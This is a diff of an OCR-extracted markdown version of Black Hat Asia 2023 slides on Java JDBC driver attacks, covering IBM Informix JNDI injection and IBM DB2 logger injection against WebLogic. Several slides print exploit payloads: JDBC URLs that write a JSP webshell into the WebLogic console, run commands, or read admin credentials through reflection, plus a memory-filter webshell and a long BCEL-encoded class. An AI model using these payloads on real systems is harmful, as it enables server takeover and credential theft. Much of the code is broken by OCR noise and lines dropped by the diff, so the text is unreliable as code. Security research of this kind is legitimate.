@@ -8,19 +8,25 @@ year: 2023
 source_pdf: "Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf"
 pages: 80
 sha256: "b4399795a643547329953d519df98715a926199d773d339ecb015bb8323a1903"
-text_chars: 73665
-ocr_pages: 45
+text_chars: 52109
+ocr_pages: 44
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 86.0
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:59:04Z"
+converted_at: "2026-08-12T03:53:25Z"
 ---
 # A new attack interface in Java
 
 **Speakers:** Yuanzhen  
 **Conference:** Black Hat ASIA 2023  
 **Source:** `Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf` (80 pages)
+
 
 ## Slide 1
 
@@ -32,10 +38,10 @@ Xu Yuanzhen
 
 #BHASIA   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifek hat
 ASIA &
 MAY 11-12
 BRIEFINGS
@@ -90,7 +96,8 @@ JNDI Injection
 
 **JNDI Injection Remote Code  Execution Is NOT Trigged**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
@@ -104,7 +111,8 @@ G JNDI Injection Remote Code Execution Is Trigged
 
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
@@ -127,7 +135,8 @@ Attributes attrs = si.getAttributes() ;
 
 ## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 10
@@ -138,20 +147,15 @@ Attributes attrs = si.getAttributes() ;
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 public NamingEnumeration<SearchResult> search(Name varl, String var2, SearchControls var3)
 NamingException
-c
 PartialCompositeDirContext var4 this;
 Hashtable var5 = this.p_getEnvironment() ;
 Continuation var6 = new Continuation(varl, vars);
 Name var8& = varl;
 NamingEnumeration var/;
-f
 try 4
-. L
 for(var? = var4.p_search(var8, var2, var3, var6); var6.isContinue(); var7 =
 var4.p_search(var8, var2, var3, varé)) {
-rc
 var8 = var6.getRemainingName () ;
-vara
 getPCDirContext(var6) ;
 thre
 OWS
@@ -161,7 +165,8 @@ OWS
 
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
@@ -182,7 +187,8 @@ IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
@@ -195,7 +201,6 @@ IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 7 if (var5 ! ULL && !var5.isEmpty()) {
 8 eo) Object var7;
 9 if (!var5.get(0).equals("")) {
-11 e) var7 \is.c_resolveIntermediate_nns(var6, var2);
 13 var2.setContinue(var/, var6, iS, var5);
 14 } else if (var2.isContinue()) {
 16 var2.appendRemainingName(var5) ;
@@ -207,7 +212,8 @@ IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
@@ -224,7 +230,6 @@ IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 ll public Object getContent() {
 12 return var3;
 13 f
-14 15
 15 Reference var5 = new Reference("java. lang.Object", varA4) ;
 16 CompositeName var6 (CompositeName) varl.clone() ;
 17 var6.add("") ;
@@ -280,25 +285,22 @@ JDBC Attack Protection
 
 JSP Tag
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Logger Injection
 * Backdoor Webshell in Weblogic Server
 JSP Tag
-jdbc:db2://127.0.0.1:5001/test:password=<%Runtime.getRuntime() .exec("open -a
-calculator") }3%>;traceLevel=-1;traceFi LeAppend=false; traceFi le=
 =../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
 © Could not establish a connection because of java.lang.IIlegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: "Ru"<br/>weblogic.jdbc.common. internal. DataSourceUtil.testConnection0(DataSourceUtil.java:426)
 <br/>weblogic.jdbc.common.internal. DataSourceUtil.access$000(DataSourceUtil.java:24)<br/>weblogic.jdbc.common. internal. DataSourceUtil$1.run(DataSourceUtil.java:288)<br/>java.security.AccessController.doPrivileged(Native Method)
-<br/>weblogic.jdbc.common. internal. DataSourceUtil.testConnection(DataSourceUtil.java:285)<br/>com.bea.console.utils.jdbc.JDBCUtils.testConnection(JDBCUtils.java:928)
 <br/>com.bea.console.actions.jdbc.datasources.createjdbcdatasource.CreateJDBCDataSource.testConnectionConfiguration(CreateJDBCDataSource.java:511)<br/>sun.reflect.GeneratedMethodAccessor1084.invoke(Unknown Source)
 <br/>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br/>java.lang.reflect.Method.invoke(Method.java:498)<br/>org.apache. beehive.netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870)
 <br/>org.apache. beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809)<br/>org.apache.beehive.netui.pageflow.FlowController.internalExecute(FlowController.java:478)
 <br/>org.apache. beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306)<br/>org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336)
 <br/>org.apache. beehive.netui.pageflow.internal.FlowControllerAction.execute(FlowControllerAction.java:52)<br/>org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431)
 <br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor.access$201(PageFlowRequestProcessor.java:97)<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044)
-<br/>org.apache. beehive.netui.pageflow.interceptor.action.internal.ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors.java:64)<br/>...
 ```
 
 ## Slide 16
@@ -321,34 +323,23 @@ calculator") }3%>;traceLevel=-1;traceFi LeAppend=false; traceFi le=
 
 ###### • Backdoor Webshell in Weblogic Server
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Logger Injection
 Backdoor Webshell in Weblogic Server
 DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver ()) ;
 DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/test: password=${pageContext.setAttribute("classLoader"
-, hread.currentThread() .getContextClassLoader ()) ;pageContext.setAttribute("httpDataTransferHandler" , pageConte
-xt.getAttribute("classLoader").loadClass("weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandle
 r")) ;pageContext.setAttribute("managementService",
-pageContext.getAttribute("classLoader") . LoadClass("weblogic.management. provider .ManagementService") ) ;pageCont
-ext.setAttribute("authenticatedSubject",pageContext.getAttribute("classLoader") .loadClass("weblogic.security.
-acl.internal.AuthenticatedSubject") ) ;pageContext.setAttribute("propertyService", pageContext. getAttribute ("cla
-ssLoader") . loadClass ("web logic.management.provider.PropertyService") ) ;pageContext.setAttribute("KERNE_ID", pag
 eContext.getAttribute("httpDataTransferHandler") .getDeclaredField("KERNE_ID") ) ;pageContext. getAttribute ("KERN
 E_ID").setAccessible(true) ;pageContext.setAttribute("getPropertyService",managementService. getMethod("getProp
 ertyService", pageContext. getAttribute("authenticatedSubject"))) ;pageContext.getAttribute("getPropertyService"
 ).setAccessible(true) ;pageContext.setAttribute("prop", pageContext.getAttribute("getPropertyService") .invoke(n
-ULL, pageContext. getAttribute("KERNE_ID").get((null)))) ;pageContext.setAttribute("getTimestamp1",propertyServi
-ce.getMethod("getTimestamp1") ) ;pageContext.getAttribute("getTimestamp1") .setAccessible(true) ;pageContext.setA
 ttribute("getTimestamp2",propertyService.getMethod("getTimestamp2") ) ;pageContext. getAttribute("getTimestamp2"
 ).setAccessible(true) ;pageContext.setAttribute("username",
 pageContext.getAttribute("getTimestamp1") .invoke(pageContext.getAttribute("prop"))) ;pageContext.setAttri bute (
-"password", pageContext.getAttribute("getTimestamp2") . invoke (pageContext.getAttribute("prop"))) ;pageContext.ge
-tAttribute ("username") .concat("/") .concat (pageContext. getAttri bute ("password") ) };traceFi LleAppend=false;traceL
 evel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
-mW).
-a)
 ```
 
 ## Slide 18
@@ -357,7 +348,8 @@ a)
 
 ###### • Backdoor Webshell in Weblogic Server
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Logger Injection
@@ -366,11 +358,9 @@ Cc i) 127.0.0.1
 user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
 javax.management.builder.initial=weblogic.management.jmx.mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg.CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1 .8, launch.use.env.classpath=true } [ibm][db2]
 [jcc] Dumping all file properties: { } [ibm][db2][jec] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jec] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
-traceLevel=-1, traceFile=.././../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell jsp, User=db2, passwOrd=***** HERA A AAA AAA AAA AAA AAA AAA AAA AAA AAAS ASA SSA SASS SSS SSS SESS SESS SESS SESS SESS SESS SESE EEE,
 url=jdbc:db2://127.0.0.1:5001/test:password=weblogic/pynerd@ 123 ;traceFileAppend=true;traceLevel=- | ;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;,
 pageContext.setAttribute("httpDataTransferHandler" pageContext.getAttribute("classLoader").loadClass("weblogic.deploy.service datatransferhandlers.HttpDataTransferHandler"));pageContext.setAttribute("managementService",
 pageContext.getAttribute("classLoader").loadClass("weblogic.management.provider.ManagementService" ));pageContext.setAttribute("authenticatedSubject" pageContext.getAttribute("classLoader").loadClass("weblogic.security.acl.internal.AuthenticatedSu
-pageContext.getAttribute("getTimestamp1").invoke(pageContext.getAttribute("prop")));:pageContext.setAttribute("password" pageContext.getAttribute("getTimestamp2").invoke(pageContext.getAttribute(""prop"))):pageContext.getAttribute("username").con
 username=db2 } [ibm][db2][jcc] END TRACE_CONNECTS [ibm][db2][jcc] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036]
 java.sql.SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@5bdb 1036] SQL state = null [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue:
 ‘weblogic.kernel.Default (self-tuning)'][SQLException @ Sbdb 1036] Error code = -99999 [ibm][db2][jcc][Thread:[ ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036] Message = [ibm][db2][jcc]
@@ -379,7 +369,6 @@ java.sql.SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for qu
 com.ibm.db2.jcc.c.o.d(0.java:534) at com.ibm.db2.jcc.c.p.a(p.java:332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.jcc.b.b.(b.java:256) at com.ibm.db2.jcc. DB2Driver.connect(DB2Driver.java: 163) at
 weblogic.jdbc.common.internal.DataSourceUtil.testConnection0(DataSourceUtil .java:373) at weblogic.jdbc.common.internal.DataSourceUtil .access$000(DataSourceUtil .java:24) at
 weblogic.jdbc.common. internal .DataSourceUtil$1 .run(DataSourceUtil.java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic.jdbc.common.internal.DataSourceUtil testConnection(DataSourceUtil java:284) at
-com.bea.console.utils jdbc JDBCUtils.testConnection(JDBCUtils.java: 1011) at com.bea.console.actions.jdbc datasources .createjdbcdatasource .CreateJDBCDataSource.testConnectionConfiguration(CreateJDBCDataSource.java:524) at
 sun.reflect.GeneratedMethodAccessor803 .invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpI.java:43) at java.lang.reflect. Method .invoke(Method.java:497) at
 org.apache.bechive .netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870) at org.apache.beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809) at
 org.apache.bechive .netui.pageflow.FlowController.internalExecute(FlowController.java:478) at org.apache.beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306) at
@@ -389,13 +378,11 @@ org.apache.beehive .netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute
 org.apache.beehive .netui.pageflow.interceptor.action internal ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors.java:64) at
 org.apache.bechive .netui.pageflow.interceptor.action.ActionInterceptor.wrapAction(ActionInterceptor.java: 184) at
 org.apache.beehive .netui.pageflow.interceptor.action internal .ActionInterceptors$WrapActionInterceptorChain.invoke(ActionInterceptors.java:50) at
-org.apache.beehive .netui.pageflow.interceptor.action internal .ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors .java:58) at
 org.apache.bechive .netui.pageflow.interceptor.action internal .ActionInterceptors.wrapAction(ActionInterceptors.java:87) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.processActionPerform(PageFlowRequestProcessor.java:2116) at
 com.bea.console.internal.ConsolePageFlowRequestProcessor.processActionPerform(ConsolePageFlowRequestProcessor.java:275) at org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:237) at
 org.apache.bechive .netui.pageflow.PageFlowRequestProcessor.processInternal(PageFlowRequestProcessor.java:556) at org .apache.bechive.netui.pageflow.PageFlowRequestProcessor.process(PageFlowRequestProcessor.java:853) at
 org.apache.bechive .netui.pageflow.AutoRegisterActionServlet.process(AutoRegisterActionServlet.java:631) at org.apache.bechive.netui.pageflow.PageFlowActionServlet.process(PageFlowActionServlet.java: 158) at
 com.bea.console.internal.ConsoleActionServlet.process(ConsoleActionServlet.java:266) at org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:416) at com.bea.console.internal.ConsoleActionServlet.doGet(ConsoleActionServlet.java:135) at
-org .apache. beehive netui.pageflow.PageFlowUtils.strutsLookup(PageFlowUtils.java: 1199) at org .apache.bechive .netui.pageflow.PageFlowUtils.strutsLookup(PageFlow Utils .java:1129) at
 ```
 
 ## Slide 19
@@ -420,15 +407,14 @@ org .apache. beehive netui.pageflow.PageFlowUtils.strutsLookup(PageFlowUtils.jav
 
 ###### **WeblogicMemFilter**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ylLic cla BCELTransfer {
 blic static void main(String[] args) throws Exception{
-JavaClass cls = Repository. LoGHsujae Lass (hele Lees Tiel tenmiF | Cis? ass);
 String code = Utility.encode(cls.getBytes(), true); [_BCEL Code Transformer )
 Class<?> aClass = new ClassLoader ().loadClass("S$$BCEL$$"+code) ;
-System. out.println("$$BCEL$S"+code) .
 aClass.newInstance() ;
 ; WeblogicMemFilter {
 atic {
@@ -441,124 +427,53 @@ thread. getContextClassLoader () . loadClass("weblogic.work.ExecuteThread") .get
 workEntry.setAccessible(true) ;
 Object workentry = workEntry.get(thread) ;
 workEntry") ;
-WeblogicMem Filter
 Field connectionHandler = Berens gasolelsel0 ). getDeclaredField("connectionHandler") ;
 connectionHandler.setAccessible(true) ;
-Object http = connect ionHandler .get(.
-Field requestl http.getClass() .getDeclaredField ("request") ;
 requestl.setAccessible(true) ;
 Object servletRequest requestl.get(http) ;
 Field context serv lLetRequest. getClass() .getDeclaredField("context")
 context.setAccessible(true) ;
-Object webAppServletContext context. Esarel Stee [eteliteie(Utsisic)
-Field contextField = crea elem getClass () _getDeclaredField( "f4lterManager") ;
 contextField.setAccessible(true) ;
 Object filterManager = contextrield. get (webAppServletcontext)
 ```
 
 ## Slide 22
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 70/100 on the text kept, 37/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver()) ;
-DriverManager . getConnection("
-jdbc:db2://127.0.0.1:5001/test: password=${''.getClass() .forName('com.sun.org.apache.bcel.internal.util.ClassLoader') .newInstance() . loadClass('$$BCELS$SLS8b$ISASASASASASASASadX$8b$ 7b$5b$e7Y$7 FOSy$5b$
-b2So0$c7$b6b$3bQ$9b$a6M$b7n$89$j $d7$b2$S$c7$b1$93$5e$be$a3$bb$z$c9$91d$5d$b3$d0$j$j$jKS8asS8Ff$s$s95$8enFfSbO$c1$$$94S$db$6OSboOQsc6m1$bOF$40S$c7$d2$Bn$e9hW6HS$alt lLcOSae$7 FSIScfSD$cf$c2$ef$3bGr$7ck$5b$k$90$a
-dsSbe$ f3Sde$bes f7$ae$ F3$7e0$ fdS$e8$d5$d7$89$e8S0$ Fd$87$95$y$ F4$I$x$7d$92$3eSc5$_S$3fcSab$e7$acd$e2$Q$T$fdSyS$c7$ fdS9cs$99$7eSdeBSbf$60$a6_4$93wS98S3eMSbfd$r$x$ fd$b2$99$3esSc3Sefsbfb$a5_Sa5$cfZSBSfesi_$fd
-$g$87$3do$al_$b7$d0$e7$z$ F4ShSws fam$x$ FdSws fdSb6$85T $8e$ F8$j $x$7d$81$T$7 F$81$7eSd7BSVSL$7d$d1Bu$L5$z$ F4$r3$ fd$9e$99$ 7eSdFfL_S$b6S92$8b$5eSe0$b4$b7$y$d41$d3wsact$96$ fe$80_$ feSdOB$7 fdSal$SN$L$bd$c8$95$fa
-$aa$95$k$a5$3Ff$e6$ fOSaf$99$e9$b6$99$5e$Sh$esj Sa9R$d2$9eSUhSeOSecSb9Sa4S40Ssw5Saf$l4$gSwUS94H$b3$9cS$easSebRN$FSc4$k$aa$ca$92$9a$94$ea$rs feSdcS$D$9aSb4bS$a9Sn$d0S5cHSaes96$e7$94S8eT S$aesa9$cas$dc$cd$7cN$9
-e$934M$927S$e7$ F29$d7$5cI$c9$a9$d5BI$O$xe_1$d5$94$ faSVS81$y$FEsSabRS$D$cc$8 f$9dSN$dd$94ZSd2$9cSwUSKsqSad$5eSaa$US$ aeS9cS$db$FSd2$c9$cOrD$e9S It fS$XSoRS8d7Se5bxX$d1$8a$d5$bc$b7$p$x5$adT$ad$80px$e6$i$sEsj$f6
-$83$b2a$b2Z$95$ f2I$5d$a0$T$ fb$b7$I$e9S1$90$8c$e4$a4$86r$e9sa2G$91$ab$3a$e5$c9P$a3VS$99Sx$97S gS F2$9c$c8$e2S$de$ j SMHSHSS5AMS81Sj GSaeS8bSQS5dSd6Sd5$R$e8$81$5d$a2$eb$cas$s6$aas$c8$das$9c$al$wx $Gduk$ad$ f1C$8c
-$9cS$daSeb$e5n$ad$ef$e9$89$ fd$c4w$a7$9 f$e4z$cé6$b9$9b$c3RMS$t$d3$d3$el$ebHE3$ fd$89$9ex$9FS$R$c8Sba$e3$9a$86$99$ fe$d4L$7 fF$a6m3Sbd$M7S$c5K$85$8a$a45$eb$90$ 7es fF6$bd$c4$cOSd8$d1VS$aas$b4$aa$9bI$b8g$e7$e5$dd$9
-ck$b9$9bSb0$ F3Sca$3b$cb$ea$R$c1$L$d5$dc$cd$bdSRS$daAYSN7F$a42$94ShD$3c$b7$e0$_$cbUYSed$e5$aalS$ca5xX$bf$al$e7S$d35$qS9bRSaf$I$ql$1$e48$c4$ fisbes92$a2r$bfS9b$cbR$ad$G$ 7dSmSab$yi$c8$j $IBS86$eaI$a3$a9j$eo
-S$$Se1Sh$E$40$xS$d6SVSvS$b fwSb5u$j $c6$b3$ab$5d$adoz$xZ$bd$db$5b$x$c6z$5cS$aev$wSd8$M$8eSOH$95$bc$ca$b3$c61$d44$ec$60$a9$x$c f6$95$866$_SdOSb1$86Ro$a9$8aSw3$mP$IL$9a$d2$cl1j$a2$ad$e4x$ad$w7$I$dc$7dSbo$adG$s
-a0$Sdb$bOcrx$aaH$F $be$c5D$5d$v$94Sg$80$yY$a5$d5$P$cb$d4$k$c f$84$40$d1$e3$1$3 F$80SQhSd2$bOS$b3$a9$95$d49VSafKS5dSO$Se6QOhS8d$uxS$9buu$c7$d1$c7$7d$c1$d0$ba7$ fF6$8cS$3b$c4$e2$ figSe2$eb$b1s60Sc4oSa6wsccs$ F4$e7$
-e8ZhS$3 FhS$Sed0$88ws9buY$81bS60S9FS3aSdO$F$k$e7S9b$daSe8$C$5d$E$a7$8d$5e$a50$d8$e8$_$e85$90$k$5ej 6z$9d$bei $a3ezC$a0$b1$ Fd9$Sp$do0$d1$bc$b2$81$9eSd5k$wS$a3$ for$d7L$7 Fi Sa30Q$dOF$df$ab6$bf$Sse8$elw$e9$o06$ fak
-ZSDEd$a3$3b$ f4$a6$8d$ fe$s6s feSd6Fosd1$df$d9se8m$ce$s7d$y$dfSadh$e5$921$d8$81Sa8$kS99S9bSwSac$_vS5b$97S$$b5SK$8c10$94I S$acS$casbcm$b6$mSb6$d9$r 7c$8b$ee6s30$3b$cO$3cN$7c$_$G$99$e7r$90ySd9SwcSISwS8dVSo9sy
-SVvSdd$ee$82$e8aSde$e8$ws$ f3$sx$acPeSd1$b6$Yp$b7E$dOm$82$$$c3$e2S$80$c5$dbb$Y$bOSI$ f3$5esmOSefS$e5$A$ f31$7c$bd$o$ FO$97$a5$d4B$z$efSb9$88usb8$bas9a$cc$ed$k$ F3S$e4$5c1$95ESd9$b5usSbf$das$cc$s$wSebs$a9$VUVCSc
-5LS$b9$c3S$e1$flusff$d2$cdL$aas$93$casa4wj $99$d4I$p$obSdc$cly$f3$ febMn$7bYhSb3$d3$cc$abSa3$ad$5c$wSa9$c9$ae$a2$9a$ F3Sb7S5bSb9$ F2$d2VSeeBSb2$9bq$rZ$d9$b2$da$c8$ fo$93$dd$dO$85$98Sw_$88Sb6$92$ feSe4V$des9b
-Sad$e5$Cx$be$d9Se0z$d4re$d5$IS99ShS$ab$de$ces$b3$99t$b6$a8Sb8$97Sb6$b2Se9SVwSces9ft$sEs9cs$3ds$das$cd$1$e4 Fk$Sd9SadF$zY$ FO2$8Ff$7 F$1$ i $baSESdeSh$bf$c8D1$92MSc7S$aaSbO$3 fSk$db$8asd0$dd$I$ faSz$e8$Q$scc$ fas97$F
-cRS$aa$83$e7$a0$c8$7c$8dSea$baSbfV$cc$97$7d$XCS$xS$oSaa$5c$c96Sb8$ad$IW$b2$9b$87$1$ F2$3e$ F8SxS9d$e4v$z$besxSdd$F$b1$95S$abD$d45$e7$3b$eax$cd$a4$d4Se6ZwMqslg$ fd$3eg$s$eaeL$d5$dcx$wesq$85$b7$c7$Lru$8a$b9$
-b2SdcJISEVZ$ZWrkKSe6vSblHSp$9b$e21$ fF6$ad$80$ 7eM$3e$a8$tl_SIKes$9FfSx$93$$$b4v$ FOSeesa5$ F5$be$$$89r$b2$930SnF$kS$$S$ef$9es8e$800$c9$ fe$a5$ab6S$ecI$40$c6$d2$bb$c9$e8$d3$SBS8FPS$3 FSH$a2$aebQS$e2$ fa$89$daa$ fc$3d$
-bfSafxSqSbfSaf$96Sd3s$p$d2$cd$ab6$91$bf$ees fcas f4$d5$7cSmSd6SO9S8b$ce$/c$40$bc$8Ff$fes f3seby$bfSefSa6Se4$9c$_Sca$3eSpwy$cdA$a7$d5xXS$bax3$9b$Sws9dRSkzS$b6es$96$uSeOS8b$ i $S$5d$3cOc$dd$dc$85M$ fO$d7$d6$8d$3cN
-r$dd$ f4Z$d9$93SbfSa5$FS3dSW$k$c6$92LDM$b9$93$HcS$eb$e2$ faSb1V$3c$Qs$ca$be$7en$c4$e2$d9$b4o0$3es$9b$8es FOSbc$ F7d$5c$ F3S9bSk$s$s$98S8F$ Fb$b6Exx$7cS$9d$x$ F3Sd0aS$c FKQSdcK$D$7dQ$d FS$V$c8ZSISb9IVj $b9S$d2R$v$93$8
-eSadlOwSuSsVSOs$d1$c9B$9b$rS$dbP$b2$zf$b1$97$84$dcFoh$s87s99ScFfSc9Sd2ScOESkS$ySF$dc$Gp$F$e6$ f7$ea$3c$Z$ F8SqSd3n$b3$y$TSel7$b1SMS3b$8b$cc$_S$c3$ce$FfFfC$cd$a3v$bdz$adxS5b9$bf$af$99$ed$$$5d$cb$e0$cd0Sa3sSe7F$
-ec$fe$b5$c1$f9$5c$G$9F$94$baSdc$8a$t$96$7c$8as L$ fe$M$a0$7 F$b8xN$z$i $e4S9dsdf$ f1i$ F7$5eZ$d6Sa9SASb6Sab$ F6Se1SwSa6wseb$3bz$ad$e7$D$ FOeY$5eS5cMt$O$ f5$ F7S$g5 F2Sc5wSwSe6$eeScb$a7$ f7Y$d8$ees f7u$ F3$a8$5d_$bc
-PSdbGS$hS95ScOK$c8$c3$c8&SwS97 Se5M$ j S8eSe3Sb5S$9cuSr$9ds$ F1Sd4B$3b$9 F$8eq$s F9j $s$e5$84$cdrs F5$9enj $xSe4T $9brSA5SA$ FdSb2$vs9FfSa6scb$dcSed$b3$ fds fcL$a7$db$84$7c$dfsaa0sSaf$s$90$ F3Se25 Fc$3b$ FOSRy$hi$e7$5c$L
-S5bYS f4S rwSw$8 f$de$92SefIJi$p$3esbesSees3d$ fb$ F8$7e$ IJ$ee$87 IS y$zSa3$bFf$c3$c7$bcSXx$E$ f8$3es f1$c4$abS$deSc3wSeb$b6$8 F$96$ FbSed$82Sbes8er$bfSVs$8ds$ fa$8Ff$_52$ fFO$3b$ F4qSC$d7Sec$ Ff FSW F8SSHS7bOL$7 F$cf$F1Sb2$ FF
-SffS$5eSce$ fb$b4$hv$U$d8$3a$e3$flesfcsT$e5$ff$bc$l$fO$7b$9aCSc2m$sr$3c$3e$besd5$ba$ccxN_Sbby$a9$e1$83Sdf$ef$m$bFfSH9$83$3b$8ar$e3$afSIS8cs f3Se0$c2_$xX$c4$86$bedh$5e$81$uSe7$935 f9$ F3Sbc$bes$9d$$$c2$dFf$e9
-$ad3$3aa$c1$e0$85$M$5d$96SafSASkCSb5$be$y$c6$ f5$ISUSd8SGSbfSebSbb3$de$7b$$$g$ Fb$cO$a6S60$BSec$ fa$3eSde$Yc$b2$n$cO$7 f$b9$desSs6$dek$85hVSUS83$9e$s$7eSa3x$cl$e3g$3e9$G$ a6$cbn0$d5$d7 13_$w$w$zaSeb$yS$ebSE
-SD$89$ f9MSaf$b7PS5cOEST$bbx$c4uSadScdV$b4$CS5b$5d$xd$b2b$3d$83$96$b2$e9$c3s8R$90$ f5g0SbcSbbScOSyY$e2$wj Sas fol FSc5h8Sv$S$ca$cc$b3$98a$des9IOws5bSed$C$_z$3d$ySe45L5$7c$ f9SySc3Sbb$V$3e$d7$ fF8$3b$ROqSdo00$
-3f$dees fONS85w$$1$c4$j$9aS$e0$ Fd$da$8fv$5bSQScb$9c$_W$e0$zn$93$9b$kS$e7N$ F4GS f 1$0$ e5$0Sb3$V$b8$8es F3$ad$b4$99$8a$ feSARSceS$df$e0$c fUSeeST $dO$b7$98xXe$ FeSb6$el$d1$5c$9b$d5$98Sbb$aaSa7$A$7cSc5VSdb$aca$c4$
